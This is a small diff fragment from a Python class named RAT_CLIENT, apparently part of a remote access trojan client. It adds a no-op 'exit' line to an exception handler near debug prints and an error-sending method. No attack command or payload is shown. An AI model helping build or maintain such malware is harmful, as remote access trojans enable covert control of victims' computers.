@@ -51,6 +51,7 @@ class RAT_CLIENT:
             print (e)
             hh=1
             print (hh)
+            exit
             
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
